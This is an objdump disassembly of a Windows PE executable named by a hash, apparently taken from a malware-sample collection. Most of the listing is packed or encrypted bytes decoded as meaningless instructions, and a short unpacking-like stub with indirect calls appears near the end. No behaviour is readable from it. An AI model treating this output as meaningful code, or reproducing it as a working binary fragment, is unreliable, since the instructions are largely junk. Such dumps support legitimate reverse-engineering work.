
a499cf2049b07ec712d16919a33bb8fe1e851bd3947af2963092f05b31f1718c.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	pop    ebp
  4d0001:	mov    ebp,0x2435d15c
  4d0006:	jl     0x4d0065
  4d0008:	push   ebp
  4d0009:	imul   dl
  4d000b:	xchg   DWORD PTR [edi-0xf49f0e7],edi
  4d0011:	xchg   ebx,eax
  4d0012:	xchg   ebx,eax
  4d0013:	int    0xc
  4d0015:	fs enter 0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	inc    esi
  4d06c1:	ficomp WORD PTR [edx]
  4d06c3:	adc    DWORD PTR [ecx+0x7c17195b],edx
  4d06c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d06ca:	cs scas eax,DWORD PTR es:[edi]
  4d06cc:	in     al,dx
  4d06cd:	inc    ecx
  4d06ce:	stos   BYTE PTR es:[edi],al
  4d06cf:	jmp    0xabf71911
  4d06d4:	or     DWORD PTR [eax],0x18
  4d06d7:	bound  edx,QWORD PTR [edx-0x2de43426]
  4d06dd:	push   ss
  4d06de:	arpl   bx,cx
  4d06e0:	cwde   
  4d06e1:	mov    ch,0x83
  4d06e3:	add    al,0x17
  4d06e5:	aam    0x21
  4d06e7:	ffree  st(5)
  4d06e9:	dec    ebp
  4d06ea:	jge    0x4d075c
  4d06ec:	pop    edi
  4d06ed:	call   DWORD PTR ds:0x4d202c
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d2078
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0709:	sub    esp,0x38
  4d070c:	lea    ebx,ds:0x4d3014
  4d0712:	xor    DWORD PTR [ebx+0x98],0xffffa2e3
  4d071c:	push   0x0
  4d071e:	call   0x4d0ecc
  4d0723:	add    esp,0x4
  4d0726:	push   ebx
  4d0727:	push   ecx
  4d0728:	push   DWORD PTR [ebx+0x84]
  4d072e:	call   0x4d0e7c
  4d0733:	add    esp,0x8
  4d0736:	pop    ebx
  4d0737:	mov    edx,0x4d203c
  4d073c:	mov    edx,DWORD PTR [edx]
  4d073e:	push   edx
  4d073f:	push   DWORD PTR [ebx+0x1d0]
  4d0745:	pop    ecx
  4d0746:	call   ecx
  4d0748:	add    esp,0x38
  4d074b:	pop    ebp
  4d074c:	ret    
  4d074d:	add    BYTE PTR [eax],al
  4d074f:	add    BYTE PTR [edi-0x1],bl
  4d0752:	adc    eax,0x4d2014
  4d0757:	call   edi
  4d0759:	add    BYTE PTR [eax],al
  4d075b:	add    BYTE PTR [edi-0x1],bl
  4d075e:	adc    eax,0x4d207c
  4d0763:	call   edi
  4d0765:	add    BYTE PTR [eax],al
  4d0767:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d076d:	sub    esp,0x34
  4d0770:	mov    edx,0x4d3078
  4d0775:	add    DWORD PTR [ebp-0x2c],0xffffffae
  4d0779:	push   edx
  4d077a:	push   DWORD PTR [edx+0x24]
  4d077d:	push   ebx
  4d077e:	push   esi
  4d077f:	call   0x4d07ac
  4d0784:	add    esp,0xc
  4d0787:	pop    edx
